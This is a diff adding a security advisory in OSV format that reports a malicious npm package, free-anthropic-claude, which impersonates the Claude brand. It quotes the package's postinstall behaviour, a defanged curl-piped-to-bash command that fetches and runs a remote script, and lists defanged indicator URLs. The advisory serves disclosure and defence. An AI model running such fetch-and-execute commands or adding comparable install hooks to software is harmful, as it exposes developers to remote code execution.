@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-5804",
+  "modified": "2026-06-20T18:57:13Z",
+  "published": "2026-06-20T18:56:00Z",
+  "summary": "Malicious code in free-anthropic-claude (npm)",
+  "details": "Package free-anthropic-claude combosquats Anthropic's Claude brand to trick users into remote code execution. The postinstall hook masquerades as a legitimate Claude desktop installer (downloading from claude[.]ai) but also runs `curl -fsSL hxxps://claude[.]ai/install[.]sh | bash` to pipe a remote script directly to the shell, and executes `npx scan-only --diagnose` from another untrusted package.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "free-anthropic-claude",
+        "purl": "pkg:npm/free-anthropic-claude@1.0.0"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/free-anthropic-claude/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-5804"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-20T18:56:00Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "claude[.]ai"
+        ],
+        "url_observed": [
+          "hxxps://claude[.]ai/download/mac",
+          "hxxps://claude[.]ai/download/windows",
+          "hxxps://claude[.]ai/install[.]ps1",
+          "hxxps://claude[.]ai/install[.]sh"
+        ]
+      }
+    }
+  }
+}
